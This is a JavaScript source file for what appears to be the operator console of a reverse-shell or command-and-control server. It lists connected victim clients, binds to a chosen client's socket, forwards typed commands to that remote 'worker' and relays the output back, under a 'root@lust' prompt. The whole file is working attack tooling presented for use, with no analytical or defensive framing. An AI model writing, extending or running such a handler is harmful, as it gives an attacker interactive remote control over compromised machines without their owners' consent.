const readline = require('readline') 
const moment = require('moment')
const { welcomeText } = require('./text')
const { getIndexedClientsList, getClientByIndex } = require('./utilities')
require('colors')

const _commands = {
  '.help': 'display this message',
  '.clear': 'clear the screen and display the welcome text',
  '.list': 'list connected clients',
  '.bind <n>': 'bind to a client and connect to his established socket',
  '.unbind': 'detach the connection from the selected client',
  '.uptime': 'show server uptime',
  '.credit': 'display credits',
  '.quit': 'close your connection',
  '.exit': 'shutdown the entire server'
}

function defaultCompleter (line) {
  const completions = Object.keys(this.commands)
  const hits = completions.filter(function (c) {
    if (c.indexOf(line) === 0) {
      return c
    }
  })
  return [hits && hits.length ? hits : completions, line]
}

class Interface {
  constructor ({ commands, welcomeMsg, completer, socket, server, testing, marker } = {}) {
    this.commands = commands || _commands
    this.welcomeMsg = welcomeMsg || welcomeText
    this.completer = completer || defaultCompleter.bind(this)
    this.testing = !!testing
    if (!this.testing && !socket) throw Error('Socket is required!')
    if (!server) throw Error('Please provide a server instance!')
    this.socket = socket
    this.server = server
    this.rl = this.testing ? readline.createInterface(process.stdin, process.stdout, this.completer) : readline.createInterface(this.socket, this.socket, this.completer)
    this.marker = marker || 'root'.brightMagenta + '@'.brightWhite + 'lust'.brightBlue + ' ~> '.brightGreen
    this.rl.setPrompt(this.marker, this.marker.length)
    this.socket.on('close', () => {
      // master client closed
      this.removeSendToListeners()
      this.sendTo = null
    })
  }

  getHelp () {
    const msg = []
    for (const i in this.commands) {
      msg.push(`${i}\t\t${this.commands[i]}`)
    }
    return msg.join('\n').grey
  }

  welcome () {
    this.response(this.welcomeMsg.red)
    this.rl.prompt()
  }

  response (out) {
    const write = this.testing ? process.stdout.write.bind(process.stdout) : this.socket.write
    write(`${out}\n`)
  }

  onData () {
    if (this._onData) return this._onData
    this._onData = function (chunk) {
      this.socket.write(chunk.toString()) // in data
    }
    this._onData = this._onData.bind(this)
    return this._onData
  }

  removeSendToListeners () {
    if (this.sendTo) {
      this.sendTo.removeListener('data', this.onData())
      this.sendTo.removeListener('close', this.onClose())
      this.sendTo.removeListener('end', this.onClose())
    }
  }

  onClose () {
    if (this._onClose) return this._onClose
    this._onClose = function () {
      if (!this.sendTo) return
      this.removeSendToListeners()
      this.rl.setPrompt(this.marker, this.marker.length) // reset marker
      this.socket.write(`[connection closed with ${this.sendTo.id}]\n`.red)
      this.sendTo = null
    }
    this._onClose = this._onClose.bind(this)
    return this._onClose
  }

  exec (command) {
    if (command[0] === '.') {
      const now = moment().format('MMM Do YYYY, HH:mm:ss')
      switch (command.slice(1).split(' ')[0]) {
        case 'help':
          this.response(this.getHelp())
          break
        case 'clear':
          console.clear()
          this.response(this.welcome())
          break
        case 'list': {
          let clients = getIndexedClientsList(this.server.getClients())
          clients = clients.length ? clients.join('\n').green : 'No clients connected'.grey
          this.response(clients)
          break
        }
        case 'bind': {
          const index = command.slice(1).split(' ')[1]
          if (!index) return this.response('Please provide a client ID'.red)
          const targetSocket = getClientByIndex(this.server.getClients(), index)
          if (!targetSocket) return this.response(`Cannot find client with Index ${index}`.red)
          if (this.sendTo) return this.response('Please first .unbind the current connection'.red)
          this.response(`Binding to ${index} on ${targetSocket.remoteAddress}:${targetSocket.remotePort}`.yellow)
          // connecting sockets
          this.sendTo = targetSocket
          this.sendTo.on('data', this.onData())
          this.sendTo.on('close', this.onClose())
          console.log(`[${now}] Master bound to client: ${targetSocket.id}`.yellow)
          const newMarker = 'root'.brightMagenta + '@'.brightWhite + 'lust'.brightBlue + `/${targetSocket.id}/`.yellow + ' ~> '.brightGreen 
          this.rl.setPrompt(newMarker, newMarker.length)
          break
        }
        case 'unbind':
          if (this.sendTo) {
            this.removeSendToListeners()
            console.log(`[${now}] Master unbound from client: ${this.sendTo.id}`.yellow)
            this.sendTo = null
            this.rl.setPrompt(this.marker.grey, this.marker.length) // reset marker
          }
          break
        case 'uptime':
          this.response(moment.duration(process.uptime(), 'seconds').humanize().green)
          break
        case 'credit':
          this.response('github.com/9xN'.green)
          break
        case 'quit':
        case 'q':
          this.response('Disconnecting...'.green)
          if (!this.testing) this.socket.destroy() // NB. socket method
          break
        case 'exit':
          this.response('Shutting down the server...'.red)
          process.exit(0)
          break 
      }
    } else {
      // only print if they typed something and if not bound to a client
      if (command !== '' && !this.sendTo) {
        this.response(`"${command}" is not a valid command...`.yellow)
      } else if (this.sendTo) {
        this.sendTo.write(`${command}\n`) // send command to the worker
      }
    }
    this.rl.prompt() // if client master socket still opened prompt for next cmd
  }

  start () {
    this.rl.on('line', (cmd) => {
      this.exec(cmd.trim())
    }).on('close', () => {
      // only gets triggered by ^C or ^D
      const now = moment().format('MMM Do YYYY, HH:mm:ss')
      console.log(`[${now}] A master has disconnected from the server`.red)
    })

    this.welcome()
  }
}

module.exports = Interface
